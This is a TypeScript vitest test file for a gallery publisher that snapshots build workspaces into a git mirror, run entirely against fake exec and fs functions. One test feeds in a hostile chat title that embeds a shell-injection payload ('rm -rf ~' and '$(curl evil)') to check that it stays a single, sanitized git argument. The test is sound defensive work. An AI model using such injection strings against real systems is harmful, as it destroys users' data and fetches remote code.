import type { Logger } from "pino";
import { describe, expect, it, vi } from "vitest";
import {
  createGalleryPublisher,
  type GalleryConfig,
  type GalleryExec,
  type GalleryFs,
  resolveGalleryConfig,
  sanitizeCommitTitle,
  workspaceCopyFilter,
} from "./gallery-publisher.js";

/**
 * quick-22l Task 2: the host-side gallery snapshot publisher, tested ENTIRELY
 * against injected exec/fs fakes — vitest never runs real git/fs/network
 * (project seam discipline). The safety-critical assertions:
 *   - T-22l-02: chat titles reach git only as ONE argv element of an arg ARRAY;
 *     the exec seam's type has no `shell` field at all.
 *   - T-22l-03: node_modules + dotfiles/dotdirs provably never enter a commit.
 *   - T-22l-04: publishNow NEVER rejects — failure is a resolved status + a
 *     loud logger.error, never a throw into the pipeline.
 */

const fakeLogger = (): Logger =>
  ({ error: vi.fn(), warn: vi.fn(), info: vi.fn() }) as unknown as Logger;

const TEST_CONFIG: GalleryConfig = {
  repoUrl: "https://github.com/rconn0925/vibecoding-gallery.git",
  mirrorDir: "data/gallery-mirror",
  workspaceRootUnc: "\\\\wsl.localhost\\vibecoding-build\\home\\builder\\projects",
};

interface ExecCall {
  file: string;
  args: string[];
  opts: { cwd?: string } | undefined;
}

/** A recording exec fake. `behavior` may override per-call results/rejections. */
function captureExec(behavior?: (call: ExecCall) => Promise<{ stdout: string }> | undefined): {
  exec: GalleryExec;
  calls: ExecCall[];
} {
  const calls: ExecCall[] = [];
  const exec: GalleryExec = async (file, args, opts) => {
    const call: ExecCall = { file, args: [...args], opts };
    calls.push(call);
    const overridden = behavior?.(call);
    if (overridden) return overridden;
    // Default stdout shapes: a dirty status, a stable hash, empty otherwise.
    if (args.includes("--porcelain")) return { stdout: " M app-1/index.html\n" };
    if (args.includes("rev-parse")) return { stdout: "abc1234def\n" };
    return { stdout: "" };
  };
  return { exec, calls };
}

/** A recording fs fake. `mirrorExists` controls the access(mirror/.git) probe. */
function captureFs(mirrorExists: boolean): {
  fsx: GalleryFs;
  rmCalls: string[];
  cpCalls: Array<{ src: string; dest: string }>;
  mkdirCalls: string[];
} {
  const rmCalls: string[] = [];
  const cpCalls: Array<{ src: string; dest: string }> = [];
  const mkdirCalls: string[] = [];
  const fsx: GalleryFs = {
    rm: async (p) => {
      rmCalls.push(p);
    },
    cp: async (src, dest) => {
      cpCalls.push({ src, dest });
    },
    mkdir: async (p) => {
      mkdirCalls.push(p);
    },
    access: async () => {
      if (!mirrorExists) throw new Error("ENOENT");
    },
  };
  return { fsx, rmCalls, cpCalls, mkdirCalls };
}

describe("workspaceCopyFilter — the secrets gate (T-22l-03)", () => {
  it("rejects any path containing a node_modules segment", () => {
    expect(workspaceCopyFilter("app-1/node_modules")).toBe(false);
    expect(workspaceCopyFilter("app-1/node_modules/express/index.js")).toBe(false);
    expect(workspaceCopyFilter("app-1\\node_modules\\express\\index.js")).toBe(false);
  });

  it("rejects any basename starting with '.' (dotfiles AND dotdirs)", () => {
    expect(workspaceCopyFilter("app-1/.env")).toBe(false);
    expect(workspaceCopyFilter("app-1/.git")).toBe(false);
    expect(workspaceCopyFilter("app-1/.cache")).toBe(false);
    expect(workspaceCopyFilter("app-1\\.config")).toBe(false);
  });

  it("accepts normal project files", () => {
    expect(workspaceCopyFilter("app-1/src/index.ts")).toBe(true);
    expect(workspaceCopyFilter("app-1/package.json")).toBe(true);
    expect(workspaceCopyFilter("app-1/README.md")).toBe(true);
  });
});

describe("sanitizeCommitTitle — message hygiene (defense-in-depth)", () => {
  it("strips control chars, collapses whitespace, truncates to 80, falls back when empty", () => {
    expect(sanitizeCommitTitle("hello\r\nworld\ttabs")).toBe("hello world tabs");
    expect(sanitizeCommitTitle("   spaced    out   ")).toBe("spaced out");
    expect(sanitizeCommitTitle("x".repeat(200))).toHaveLength(80);
    expect(sanitizeCommitTitle("")).toBe("untitled build");
    expect(sanitizeCommitTitle("\x00\x01\x1f")).toBe("untitled build");
  });
});

describe("resolveGalleryConfig", () => {
  it("defaults repoUrl/mirror/UNC root and stays enabled for any value except exact 'false'", () => {
    const config = resolveGalleryConfig({});
    expect(config).not.toBeNull();
    expect(config?.repoUrl).toBe("https://github.com/rconn0925/vibecoding-gallery.git");
    expect(config?.mirrorDir).toBe("data/gallery-mirror");
    expect(config?.workspaceRootUnc).toBe(
      "\\\\wsl.localhost\\vibecoding-build\\home\\builder\\projects",
    );
    expect(resolveGalleryConfig({ GALLERY_PUBLISH_ENABLED: "0" })).not.toBeNull();
    expect(resolveGalleryConfig({ GALLERY_PUBLISH_ENABLED: "FALSE" })).not.toBeNull();
  });

  it("returns null ONLY for the exact string 'false' (AUTO_ROUND_ENABLED idiom, inverted)", () => {
    expect(resolveGalleryConfig({ GALLERY_PUBLISH_ENABLED: "false" })).toBeNull();
    expect(resolveGalleryConfig({ GALLERY_PUBLISH_ENABLED: " false " })).toBeNull();
  });

  it("honors GALLERY_REPO_URL and the sandbox distro/user env overrides", () => {
    const config = resolveGalleryConfig({
      GALLERY_REPO_URL: " https://github.com/other/repo.git ",
      BUILD_DISTRO_NAME: "custom-distro",
      BUILD_DISTRO_USER: "someone",
    });
    expect(config?.repoUrl).toBe("https://github.com/other/repo.git");
    expect(config?.workspaceRootUnc).toBe(
      "\\\\wsl.localhost\\custom-distro\\home\\someone\\projects",
    );
  });
});

describe("createGalleryPublisher.publishNow", () => {
  it("happy path: clone (mirror missing) → filtered copy → add/status/commit/push/rev-parse, git arg arrays ONLY", async () => {
    const { exec, calls } = captureExec();
    const { fsx, rmCalls, cpCalls, mkdirCalls } = captureFs(false);
    const publisher = createGalleryPublisher({
      config: TEST_CONFIG,
      exec,
      fsx,
      logger: fakeLogger(),
    });

    const result = await publisher.publishNow({
      generation: 1,
      title: "make a counter app",
      taskId: "task-1",
    });

    expect(result).toMatchObject({ status: "published", commitHash: "abc1234def" });
    // Mirror bootstrap: parent mkdir + clone (arg array).
    expect(mkdirCalls.length).toBeGreaterThan(0);
    // Snapshot copy: replace-copy of the UNC workspace dir into the mirror.
    expect(rmCalls).toContain("data/gallery-mirror/app-1");
    expect(cpCalls).toEqual([
      {
        src: "\\\\wsl.localhost\\vibecoding-build\\home\\builder\\projects\\app-1",
        dest: "data/gallery-mirror/app-1",
      },
    ]);
    // EVERY exec call is `git` with an arg ARRAY — never a shell string.
    for (const call of calls) {
      expect(call.file).toBe("git");
      expect(Array.isArray(call.args)).toBe(true);
    }
    expect(calls.map((c) => (c.args[0] === "-C" ? c.args[2] : c.args[0]))).toEqual([
      "clone",
      "add",
      "status",
      "commit",
      "push",
      "rev-parse",
    ]);
    expect(calls[0]?.args).toEqual([
      "clone",
      "https://github.com/rconn0925/vibecoding-gallery.git",
      "data/gallery-mirror",
    ]);
    expect(calls[1]?.args).toEqual(["-C", "data/gallery-mirror", "add", "-A"]);
    expect(calls[2]?.args).toEqual(["-C", "data/gallery-mirror", "status", "--porcelain"]);
    expect(calls[4]?.args).toEqual(["-C", "data/gallery-mirror", "push", "-u", "origin", "HEAD"]);
    expect(calls[5]?.args).toEqual(["-C", "data/gallery-mirror", "rev-parse", "HEAD"]);
  });

  it("a hostile chat title reaches the commit as ONE argv element, sanitized; no exec call carries shell: true (T-22l-02)", async () => {
    const hostile = `x"; rm -rf ~ $(curl evil) \r\n--force${"A".repeat(200)}`;
    const { exec, calls } = captureExec();
    const { fsx } = captureFs(true);
    const publisher = createGalleryPublisher({
      config: TEST_CONFIG,
      exec,
      fsx,
      logger: fakeLogger(),
    });

    const result = await publisher.publishNow({ generation: 3, title: hostile, taskId: "task-3" });
    expect(result.status).toBe("published");

    const commit = calls.find((c) => c.args.includes("commit"));
    expect(commit).toBeDefined();
    // The whole message is exactly ONE argv element following -m.
    expect(commit?.args.slice(0, 4)).toEqual(["-C", "data/gallery-mirror", "commit", "-m"]);
    expect(commit?.args).toHaveLength(5);
    const message = commit?.args[4] ?? "";
    expect(message).toBe(`app-3: ${sanitizeCommitTitle(hostile)}`);
    // Control chars stripped; the title portion truncated to 80.
    // biome-ignore lint/suspicious/noControlCharactersInRegex: asserting control chars are ABSENT is the point
    expect(message).not.toMatch(/[\r\n\t\x00-\x1f]/);
    expect(sanitizeCommitTitle(hostile).length).toBeLessThanOrEqual(80);
    // NO exec call ever receives an options object containing shell: true.
    for (const call of calls) {
      expect(call.opts && "shell" in call.opts).toBeFalsy();
    }
    // Type-level: `shell` is UNREPRESENTABLE at the exec seam.
    // @ts-expect-error — GalleryExec's opts type has no `shell` field
    const unrepresentable: Parameters<GalleryExec>[2] = { shell: true };
    expect(unrepresentable).toBeDefined();
  });

  it("failure isolation: a rejecting push RESOLVES { status: 'failed' } and logs loudly (T-22l-04)", async () => {
    const logger = fakeLogger();
    const { exec, calls } = captureExec((call) =>
      call.args.includes("push") ? Promise.reject(new Error("remote hung up")) : undefined,
    );
    const { fsx } = captureFs(true);
    const publisher = createGalleryPublisher({ config: TEST_CONFIG, exec, fsx, logger });

    const result = await publisher.publishNow({ generation: 2, title: "t", taskId: "task-2" });
    expect(result).toEqual({
      status: "failed",
      commitHash: null,
      detail: expect.stringContaining("remote hung up") as unknown as string,
    });
    expect(logger.error).toHaveBeenCalled();
    // The push WAS attempted; the failure never escaped as a rejection.
    expect(calls.some((c) => c.args.includes("push"))).toBe(true);
  });

  it("no changes: empty porcelain → no commit/push, resolves { status: 'no-changes', commitHash: null }", async () => {
    const { exec, calls } = captureExec((call) =>
      call.args.includes("--porcelain") ? Promise.resolve({ stdout: "" }) : undefined,
    );
    const { fsx } = captureFs(true);
    const publisher = createGalleryPublisher({
      config: TEST_CONFIG,
      exec,
      fsx,
      logger: fakeLogger(),
    });

    const result = await publisher.publishNow({ generation: 1, title: "t", taskId: "task-1" });
    expect(result).toMatchObject({ status: "no-changes", commitHash: null });
    expect(calls.some((c) => c.args.includes("commit"))).toBe(false);
    expect(calls.some((c) => c.args.includes("push"))).toBe(false);
  });

  it("serialization: two overlapping publishNow calls never interleave their exec sequences", async () => {
    const labels: string[] = [];
    const exec: GalleryExec = async (_file, args) => {
      const verb = args[0] === "-C" ? (args[2] ?? "?") : (args[0] ?? "?");
      const generationTag = args.find((a) => a.startsWith("app-"))?.split(":")[0] ?? "";
      labels.push(generationTag ? `${verb}:${generationTag}` : verb);
      // Yield the event loop so an unserialized implementation WOULD interleave.
      await new Promise((r) => setImmediate(r));
      if (args.includes("--porcelain")) return { stdout: " M x\n" };
      if (args.includes("rev-parse")) return { stdout: "hash\n" };
      return { stdout: "" };
    };
    const { fsx } = captureFs(true);
    const publisher = createGalleryPublisher({
      config: TEST_CONFIG,
      exec,
      fsx,
      logger: fakeLogger(),
    });

    const [first, second] = await Promise.all([
      publisher.publishNow({ generation: 1, title: "first", taskId: "t1" }),
      publisher.publishNow({ generation: 2, title: "second", taskId: "t2" }),
    ]);
    expect(first.status).toBe("published");
    expect(second.status).toBe("published");
    expect(labels).toEqual([
      "add",
      "status",
      "commit:app-1",
      "push",
      "rev-parse",
      "add",
      "status",
      "commit:app-2",
      "push",
      "rev-parse",
    ]);
  });
});
